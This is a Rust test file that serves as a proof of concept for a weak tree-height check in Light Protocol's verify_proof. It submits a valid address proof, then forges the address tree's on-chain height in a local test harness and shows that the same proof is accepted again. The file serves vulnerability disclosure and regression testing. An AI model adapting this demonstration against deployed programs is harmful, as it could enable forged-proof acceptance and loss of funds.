#![cfg(feature = "test-sbf")]

//! Test to demonstrate the weak tree‑height validation bug in `verify_proof`.
//!
//! This proof builds a valid Merkle proof at the default tree heights
//! (state=32, address=40), then forges the on‑chain address tree height
//! and reuses the same proof. Because `verify_proof` accepts a proof if
//! either height matches its default, both submissions succeed.

use std::collections::HashMap;

use anchor_lang::prelude::borsh::{BorshDeserialize, BorshSerialize};
use create_address_test_program::create_invoke_cpi_instruction;
use light_batched_merkle_tree::{
    constants::{DEFAULT_BATCH_ADDRESS_TREE_HEIGHT, DEFAULT_BATCH_STATE_TREE_HEIGHT},
    initialize_address_tree::InitAddressTreeAccountsInstructionData,
    initialize_state_tree::InitStateTreeAccountsInstructionData,
    merkle_tree_metadata::BatchedMerkleTreeMetadata,
};
use light_client::{indexer::AddressWithTree, rpc::Rpc};
use light_compressed_account::{
    address::{derive_address, pack_read_only_address_params, pack_new_address_params_assigned},
    instruction_data::{data::pack_pubkey_usize, with_account_info::InstructionDataInvokeCpiWithAccountInfo},
    Pubkey as LcPubkey,
};
use light_compressed_token::process_transfer::transfer_sdk::to_account_metas;
use light_program_test::{
    indexer::TestIndexer, program_test::TestRpc, LightProgramTest, ProgramTestConfig,
};
use light_prover_client::prover::{spawn_prover, ProverConfig};
use light_sdk::address::ReadOnlyAddress;
use serial_test::serial;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, signer::Signer};
use light_sdk::address::NewAddressParamsAssigned;
use light_program_test::Indexer;
use anchor_lang::Discriminator;
/// Demonstrates that the same proof is accepted before and after forging the address height.
#[tokio::test]
#[serial]
async fn reuse_proof_account_info() {
    // 0) Test env with default batched trees
    spawn_prover(ProverConfig::default()).await;
    let mut config = ProgramTestConfig::default_with_batched_trees(false);
    config.with_prover = false;
    config.v2_state_tree_config = Some(InitStateTreeAccountsInstructionData::default());
    config.v2_address_tree_config = Some(InitAddressTreeAccountsInstructionData::test_default());
    config.additional_programs =
        Some(vec![("create_address_test_program", create_address_test_program::ID)]);

    let mut rpc = LightProgramTest::new(config).await.expect("setup failed");
    let env = rpc.test_accounts.clone();
    let payer: Keypair = rpc.get_payer().insecure_clone();

    // 1) Sanity heights
    let state_tree_pk = env.v2_state_trees[0].merkle_tree;
    let addr_tree_pk = env.v2_address_trees[0];
    let state_meta = {
        let acc = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
        let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
        BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
    };
    let addr_meta = {
        let acc = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
        let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
        BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
    };
    assert_eq!(state_meta.height, DEFAULT_BATCH_STATE_TREE_HEIGHT);
    assert_eq!(addr_meta.height, DEFAULT_BATCH_ADDRESS_TREE_HEIGHT);
// Debug: show initial heights and keys
eprintln!("sanity: state_tree_pk={}, height={}", state_tree_pk, state_meta.height);
eprintln!("sanity: addr_tree_pk={}, height={}", addr_tree_pk, addr_meta.height);

    
    // 2) Build a validity proof at default heights (address root index only)
    let mut test_indexer = TestIndexer::init_from_acounts(&payer, &env, 0).await;
    let seed = [3u8; 32];
    let address = derive_address(
        &seed,
        &addr_tree_pk.to_bytes(),
        &create_address_test_program::ID.to_bytes(),
    );
    let proof_with_context = test_indexer
        .get_validity_proof(vec![], vec![AddressWithTree { address, tree: addr_tree_pk }], None)
        .await
        .unwrap()
        .value;
    let addr_root_idx = proof_with_context.get_address_root_indices()[0];
// Debug: address proof context
eprintln!("addr_root_idx={}", addr_root_idx);

    // 3) Pack accounts in the verifier's expected order
    //    First: [address_queue, address_tree]
    let mut remaining_accounts: HashMap<LcPubkey, usize> = HashMap::new();
    //let addr_queue_pk = env.v2_address_trees[0].into(); // test harness uses state queue
    let new_address_params = vec![NewAddressParamsAssigned {
        seed,
        address_queue_pubkey: addr_tree_pk.into(),
        address_merkle_tree_pubkey: addr_tree_pk.into(),
        address_merkle_tree_root_index: addr_root_idx,
        assigned_account_index: None,
    }];
    let packed_new_address_params =
        pack_new_address_params_assigned(&new_address_params, &mut remaining_accounts);
// Debug: index map after address params (sorted by index)
{
    let mut dbg_idx: Vec<(Pubkey, usize)> = remaining_accounts
        .iter()
        .map(|(k, v)| (Pubkey::from(*k), *v))
        .collect();
    dbg_idx.sort_by_key(|(_, idx)| *idx);
    eprintln!("--- index map after address params ---");
    for (pk, idx) in dbg_idx {
        eprintln!("[{idx}] {pk}");
    }
}
    //    Then: [state_queue, state_tree]
    let state_queue_pk = env.v2_state_trees[0].output_queue;
    let _state_queue_index = pack_pubkey_usize(&state_queue_pk.into(), &mut remaining_accounts);
    let _state_tree_index = pack_pubkey_usize(&state_tree_pk.into(), &mut remaining_accounts);
// Debug: index map after packing state queue/tree (sorted by index)
{
    let mut dbg_idx: Vec<(Pubkey, usize)> = remaining_accounts
        .iter()
        .map(|(k, v)| (Pubkey::from(*k), *v))
        .collect();
    dbg_idx.sort_by_key(|(_, idx)| *idx);
    eprintln!("--- index map before to_account_metas ---");
    for (pk, idx) in dbg_idx {
        eprintln!("[{idx}] {pk}");
    }
}

   
    let remaining_accounts: HashMap<Pubkey, usize> = remaining_accounts
        .into_iter()
        .map(|(k, v)| (Pubkey::from(k), v))
        .collect();
    let remaining_metas = to_account_metas(remaining_accounts);

    // Debug: AccountMeta order passed to instruction
    eprintln!("--- remaining_metas (order passed to instruction) ---");
    for (i, m) in remaining_metas.iter().enumerate() {
        eprintln!("#{}: {} (writable={}, signer={})", i, m.pubkey, m.is_writable, m.is_signer);
    }
    // 4) Build InvokeCpiWithAccountInfo payload (no read-only extras needed)
    let ix_data = InstructionDataInvokeCpiWithAccountInfo {
        mode: 0,
        bump: 255,
        invoking_program_id: create_address_test_program::ID.into(),
        compress_or_decompress_lamports: 0,
        is_compress: false,
        with_cpi_context: false,
        with_transaction_hash: false,
        cpi_context: Default::default(),
        proof: proof_with_context.proof.into(),
        new_address_params: packed_new_address_params,
        account_infos: vec![],
        read_only_addresses: vec![],
        read_only_accounts: vec![],
    };
   

    let instruction = create_invoke_cpi_instruction(
        payer.pubkey(),
        [
            light_system_program::instruction::InvokeCpiWithAccountInfo::DISCRIMINATOR.to_vec(),
            ix_data.try_to_vec().unwrap(),
        ]
        .concat(),
        remaining_metas.clone(),
        None,
    );

    // 5) Baseline must succeed
    let res_before = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction.clone()],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;
    assert!(res_before.is_ok());

    // 6) Forge the on-chain address tree height to 1 (state height left intact)
    let mut addr_account = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
    let mut slice: &[u8] = &addr_account.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    let mut meta = BatchedMerkleTreeMetadata::deserialize(&mut slice).unwrap();
    meta.height = 1;
    let mut serialized = Vec::new();
    BatchedMerkleTreeMetadata::serialize(&meta, &mut serialized).unwrap();
    addr_account.data[8..8 + serialized.len()].copy_from_slice(&serialized);
    rpc.set_account(addr_tree_pk, addr_account);
// Debug: confirm heights post-forge
let state_meta2 = {
    let acc = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
    let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
};
let addr_meta2 = {
    let acc = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
    let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
};
eprintln!("post-forge: state.height={} addr.height={}", state_meta2.height, addr_meta2.height);

    // 7) Reuse the *same* instruction/proof -> still succeeds due to OR logic
    let res_after = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;
    assert!(res_after.is_ok(), "Expected success via OR-logic after forging address height");
}
